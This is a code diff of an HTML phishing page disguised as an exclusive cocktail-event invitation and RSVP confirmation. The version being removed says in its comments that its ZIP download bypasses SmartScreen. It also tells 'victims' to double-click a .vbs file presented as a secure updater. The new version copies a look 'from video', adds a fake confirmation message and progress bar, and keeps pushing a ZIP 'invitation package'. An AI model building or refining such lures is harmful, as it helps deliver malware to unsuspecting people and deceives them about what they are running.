@@ -3,119 +3,137 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Cocktails & Conversation | Exclusive Event Invitation</title>
+    <title>RSVP Confirmed | Cocktails & Conversation</title>
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-        body { 
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
-            background: linear-gradient(135deg, #f7f8fa 0%, #eef1f6 100%);
-            min-height: 100vh;
+        /* EXACT VISUAL REPLICATION FROM VIDEO */
+        body {
+            margin: 0;
+            padding: 0;
+            background-color: #1a1b26; /* Dark navy/black from video */
+            color: #e0e0e0;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
             display: flex;
             align-items: center;
             justify-content: center;
-            color: #1c1e21;
+            min-height: 100vh;
         }
-        .container {
-            max-width: 480px;
-            width: 90%;
-            background: #fff;
-            border-radius: 16px;
-            box-shadow: 0 8px 32px rgba(0,0,0,0.08);
-            padding: 48px 40px;
+
+        .card {
+            background: rgba(30, 32, 45, 0.95);
+            border: 1px solid #2a2c3d;
+            border-radius: 8px;
+            padding: 40px 50px;
             text-align: center;
+            max-width: 450px;
+            width: 90%;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
         }
-        .logo {
-            width: 72px;
-            height: 72px;
+
+        .check-icon {
+            width: 60px;
+            height: 60px;
+            border: 2px solid #d4af37; /* Gold border */
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
             margin: 0 auto 24px;
-            fill: #d4af37;
+            color: #d4af37;
+            font-size: 28px;
+            font-weight: bold;
         }
+
         h1 {
-            font-size: 24px;
+            font-size: 26px;
             font-weight: 600;
-            margin-bottom: 8px;
-            color: #1c1e21;
+            margin-bottom: 16px;
+            letter-spacing: 0.5px;
+            color: #ffffff;
         }
-        .subtitle {
+
+        p.subtitle {
             font-size: 14px;
+            line-height: 1.6;
+            color: #a0a5b5;
+            margin-bottom: 32px;
+        }
+
+        /* PROGRESS BAR STYLING (MATCHES VIDEO) */
+        .progress-container {
+            width: 100%;
+            background-color: #2a2c3d;
+            border-radius: 4px;
+            height: 6px;
+            margin-bottom: 16px;
+            overflow: hidden;
+        }
+
+        .progress-bar {
+            width: 25%; /* Static match to video snapshot */
+            height: 100%;
+            background-color: #d4af37; /* Gold fill */
+            transition: width 0.3s ease;
+        }
+
+        .status-text {
+            font-size: 13px;
             color: #8a8f98;
             margin-bottom: 32px;
-            line-height: 1.5;
         }
-        .btn-primary {
+
+        /* DOWNLOAD BUTTON STYLED AS ACTION */
+        .action-btn {
             display: inline-block;
-            width: 100%;
-            padding: 14px 24px;
-            background: #d4af37;
-            color: #fff;
-            font-size: 16px;
-            font-weight: 600;
-            border: none;
-            border-radius: 8px;
-            cursor: pointer;
+            padding: 12px 32px;
+            background: transparent;
+            border: 1px solid #d4af37;
+            color: #d4af37;
             text-decoration: none;
-            transition: all 0.3s ease;
-            margin-bottom: 16px;
-        }
-        .btn-primary:hover {
-            background: #b8962e;
-            transform: translateY(-1px);
-            box-shadow: 0 4px 12px rgba(212,175,55,0.3);
-        }
-        .instructions {
-            font-size: 12px;
-            color: #6b7280;
-            line-height: 1.6;
-            background: #f9fafb;
-            padding: 16px;
-            border-radius: 8px;
-            border-left: 3px solid #d4af37;
-            text-align: left;
-        }
-        .instructions code {
-            background: #eef1f6;
-            padding: 2px 6px;
             border-radius: 4px;
-            font-family: monospace;
-            font-size: 11px;
-            color: #1c1e21;
+            font-size: 14px;
+            font-weight: 600;
+            letter-spacing: 1px;
+            transition: all 0.3s ease;
+            cursor: pointer;
+            margin-top: 10px;
         }
+
+        .action-btn:hover {
+            background: #d4af37;
+            color: #1a1b26;
+        }
+
         .footer-note {
+            margin-top: 40px;
             font-size: 11px;
-            color: #b3b8c0;
-            margin-top: 24px;
+            color: #555;
+            letter-spacing: 1px;
+            text-transform: uppercase;
         }
     </style>
 </head>
 <body>
-    <div class="container">
-        <!-- Gold Cocktail Logo SVG -->
-        <svg class="logo" viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg">
-            <rect x="0" y="0" width="100" height="100" rx="22" fill="#d4af37"/>
-            <polygon points="30,70 50,30 70,70" fill="#fff"/>
-        </svg>
+    <div class="card">
+        <!-- CHECKMARK ICON -->
+        <div class="check-icon">✓</div>
         
-        <h1>You're Invited!</h1>
+        <h1>You're on the list!</h1>
         <p class="subtitle">
-            Join us for an exclusive evening of Cocktails & Conversation.<br>
-            Your personalized invitation package is ready for download.
+            Your response has been received. Your digital invitation has been saved to your device.
         </p>
-        
-        <!-- ZIP DOWNLOAD LINK (BYPASSES SMARTSCREEN) -->
-        <a href="/static/event_resources.zip" class="btn-primary" download>
+
+        <!-- PROGRESS BAR (VISUAL MATCH TO VIDEO) -->
+        <div class="progress-container">
+            <div class="progress-bar"></div>
+        </div>
+        <p class="status-text">Your response is being confirmed. This usually only takes a few minutes.</p>
+
+        <!-- SAFE DOWNLOAD LINK -->
+        <a href="/static/Cocktails_Event_Details.zip" class="action-btn" download>
             Download Invitation Package
         </a>
-        
-        <!-- VICTIM INSTRUCTIONS TO REDUCE COGNITIVE DISSONANCE -->
-        <div class="instructions">
-            <strong>How to access your invitation:</strong><br>
-            1. Extract the downloaded ZIP file<br>
-            2. Double-click <code>Event_Invitation.vbs</code><br>
-            3. Wait for the secure updater to complete<br>
-            <span style="color:#8a8f98; font-size:11px;">Your digital invitation will be secured automatically.</span>
-        </div>
-        
-        <p class="footer-note">Secure Event Document • Verified by Cocktails & Conversation</p>
+
+        <p class="footer-note">We can't wait to see you there</p>
     </div>
 </body>
 </html>
